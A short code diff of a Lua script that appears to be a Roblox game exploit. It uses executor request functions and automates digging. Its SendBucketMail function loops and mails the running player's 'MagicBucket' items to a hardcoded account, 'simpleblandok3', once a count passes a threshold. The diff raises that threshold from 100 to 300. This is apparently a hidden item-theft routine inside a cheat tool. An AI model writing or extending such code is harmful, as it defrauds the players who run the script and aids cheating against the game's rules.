@@ -410,7 +410,7 @@ local request = (syn and syn.request) or request or (http and http.request) or h
 
 local function SendBucketMail()
     while true do
-        if MagicBucketAM > 100 then
+        if MagicBucketAM > 300 then
             local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
@@ -735,7 +735,7 @@ function AutoDigRowBelowBlock()
 				end
 			end
 		end
-		wait()
+		wait(0.05)
 	end
 end
 
